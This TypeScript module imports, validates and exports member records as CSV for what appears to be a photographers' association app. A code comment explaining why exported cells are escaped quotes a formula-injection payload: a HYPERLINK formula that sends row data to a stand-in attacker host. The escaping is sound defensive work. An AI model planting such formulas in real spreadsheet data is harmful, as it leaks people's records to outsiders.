import Papa from "papaparse";

import { memberInputSchema, type MemberInput } from "@/lib/validation/member";
import { escapeCsvCell } from "@/lib/validation/text-safety";

/**
 * Canonical import/export column order. The import template and the
 * exporter both derive from this list so they can never drift apart.
 */
export const CSV_HEADERS = [
  "first_name",
  "last_name",
  "email",
  "phone",
  "legacy_id",
  "profession",
  "business_name",
  "address_line1",
  "address_line2",
  "area",
  "city",
  "state",
  "pincode",
  "dob",
  "blood_group",
  "status",
  "fees_paid_upto",
  "death_fund_covered",
  "notes",
] as const;

export type CsvHeader = (typeof CSV_HEADERS)[number];

export interface CsvRowError {
  /** 1-based data row number (header excluded). */
  row: number;
  field: string;
  message: string;
}

export interface ParsedCsvRow {
  row: number;
  input: MemberInput;
}

export interface ParseResult {
  rows: ParsedCsvRow[];
  errors: CsvRowError[];
  /** Headers present in the file that the template doesn't define. */
  unknownHeaders: string[];
  missingHeaders: string[];
}

const TRUTHY = new Set(["true", "yes", "y", "1"]);
const FALSY = new Set(["false", "no", "n", "0", ""]);

function normalizeHeader(header: string): string {
  return header.trim().toLowerCase().replace(/[\s-]+/g, "_");
}

/**
 * Coerce one raw CSV record (all strings) into the shape
 * `memberInputSchema` expects, then validate it. Booleans accept
 * yes/no/true/false/1/0; profession/status accept the display labels the
 * app itself shows ("Photo & Video") as well as the enum values.
 */
export function coerceRow(
  record: Record<string, string>,
): ReturnType<typeof memberInputSchema.safeParse> {
  const get = (key: CsvHeader) => record[key]?.trim() ?? "";

  const professionRaw = get("profession").toLowerCase();
  const profession =
    professionRaw === "" ? null
    : professionRaw === "photo & video" || professionRaw === "photo and video" ? "both"
    : professionRaw;

  const statusRaw = get("status").toLowerCase();
  const feesRaw = get("fees_paid_upto");
  const deathRaw = get("death_fund_covered").toLowerCase();

  return memberInputSchema.safeParse({
    firstName: get("first_name"),
    lastName: get("last_name"),
    email: get("email"),
    phone: get("phone"),
    legacyId: get("legacy_id"),
    profession,
    businessName: get("business_name"),
    addressLine1: get("address_line1"),
    addressLine2: get("address_line2"),
    area: get("area"),
    city: get("city"),
    state: get("state"),
    pincode: get("pincode"),
    dob: get("dob"),
    bloodGroup: get("blood_group"),
    notes: get("notes"),
    status: statusRaw === "" ? "active" : statusRaw,
    feesPaidUpto:
      feesRaw === "" ? null
      : /^\d{4}$/.test(feesRaw) ? Number(feesRaw)
      : Number.NaN,
    deathFundCovered: TRUTHY.has(deathRaw)
      ? true
      : FALSY.has(deathRaw)
        ? false
        : "invalid",
  });
}

export function parseMembersCsv(text: string): ParseResult {
  const parsed = Papa.parse<Record<string, string>>(text, {
    header: true,
    skipEmptyLines: "greedy",
    transformHeader: normalizeHeader,
  });

  const fileHeaders = (parsed.meta.fields ?? []).filter((h) => h !== "");
  const known = new Set<string>(CSV_HEADERS);
  const unknownHeaders = fileHeaders.filter((h) => !known.has(h));
  const missingHeaders = ["first_name", "last_name", "address_line1", "city", "state"].filter(
    (h) => !fileHeaders.includes(h),
  );

  const rows: ParsedCsvRow[] = [];
  const errors: CsvRowError[] = [];

  parsed.data.forEach((record, i) => {
    const rowNumber = i + 1;
    const result = coerceRow(record);
    if (result.success) {
      rows.push({ row: rowNumber, input: result.data });
    } else {
      for (const issue of result.error.issues) {
        errors.push({
          row: rowNumber,
          field: String(issue.path[0] ?? ""),
          message: issue.message,
        });
      }
    }
  });

  return { rows, errors, unknownHeaders, missingHeaders };
}

export interface ExportableMember {
  memberId: string;
  legacyId: string | null;
  firstName: string;
  lastName: string | null;
  email: string | null;
  phone: string | null;
  profession: "photographer" | "videographer" | "both" | null;
  businessName: string | null;
  addressLine1: string | null;
  addressLine2: string | null;
  area: string | null;
  city: string | null;
  state: string | null;
  pincode: string | null;
  dob: string | null;
  bloodGroup: string | null;
  status: string;
  feesPaidUpto: number | null;
  deathFundCovered: boolean;
  notes: string | null;
}

export function membersToCsv(members: ExportableMember[]): string {
  const data = members.map((m) => ({
    member_id: m.memberId,
    first_name: m.firstName,
    last_name: m.lastName,
    email: m.email ?? "",
    phone: m.phone ?? "",
    legacy_id: m.legacyId ?? "",
    profession: m.profession ?? "",
    business_name: m.businessName ?? "",
    address_line1: m.addressLine1 ?? "",
    address_line2: m.addressLine2 ?? "",
    area: m.area ?? "",
    city: m.city ?? "",
    state: m.state ?? "",
    pincode: m.pincode ?? "",
    dob: m.dob ?? "",
    blood_group: m.bloodGroup ?? "",
    status: m.status,
    fees_paid_upto: m.feesPaidUpto ?? "",
    death_fund_covered: m.deathFundCovered ? "yes" : "no",
    notes: m.notes ?? "",
  }));

  // `Papa.unparse` quotes and escapes for CSV *parsing*, but does nothing about
  // spreadsheet formula execution: a member named `=HYPERLINK("http://evil
  // .test?"&A1,"Click")` fires the moment an admin opens the export in Excel,
  // leaking the row it sits in. Escaping happens here, on the way out, so
  // stored values round-trip unchanged.
  const safe = data.map((row) =>
    Object.fromEntries(
      Object.entries(row).map(([key, value]) => [
        key,
        typeof value === "string" ? escapeCsvCell(value) : value,
      ]),
    ),
  );

  return Papa.unparse(safe, {
    columns: ["member_id", ...CSV_HEADERS],
    newline: "\n",
  });
}

/** Header row + one illustrative example row, for the downloadable template. */
export function templateCsv(): string {
  const example: Record<CsvHeader, string> = {
    first_name: "Ramesh",
    last_name: "Kumar",
    email: "ramesh@example.com",
    // Not 9876543210: the importer rejects sequential runs as placeholder junk,
    // so an example row using one would fail the moment staff filled it in.
    phone: "9845011234",
    legacy_id: "MDPVA/OLD/123",
    profession: "photographer",
    business_name: "Ramesh Studio",
    address_line1: "12, MG Road",
    address_line2: "",
    area: "Lakshmipuram",
    city: "Mysuru",
    state: "Karnataka",
    pincode: "570004",
    dob: "1975-06-15",
    blood_group: "B+",
    status: "active",
    fees_paid_upto: "2026",
    death_fund_covered: "yes",
    notes: "",
  };
  return Papa.unparse([example], { columns: [...CSV_HEADERS], newline: "\n" });
}
